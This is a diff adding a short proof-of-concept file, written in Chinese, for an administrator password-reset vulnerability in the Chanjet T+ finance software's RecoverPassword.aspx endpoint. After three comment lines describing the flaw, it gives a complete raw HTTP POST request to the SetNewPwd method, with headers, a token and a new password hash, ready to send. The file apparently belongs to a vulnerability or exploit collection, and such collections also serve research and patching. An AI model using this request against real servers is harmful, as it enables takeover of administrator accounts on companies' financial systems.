@@ -1,0 +1,12 @@
+# 用友畅捷通T+RecoverPassword.aspx管理员密码修改漏洞
+# 畅捷通T+是一款互联网企业财务管理软件。
+# 畅捷通T+RecoverPassword.aspx处存在管理员密码修改漏洞，攻击者可利用此漏洞修改管理员的账户口令以登录系统，为后续攻击提供帮助。
+POST /tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx?method=SetNewPwd&acid=80000906&bid=hd_tag_m8mv25yd HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25yd
+RM-PRO-Token: 894ab6bedc0bacc4e1e640b600403270
+RM-PRO-Time: 1742808513664
+User-Agent: curl/7.83.1
+Content-Type: application/x-www-form-urlencoded
+
+id={"pwdNew":"46f94c8de14fb36680850768ff1b7f2a"}
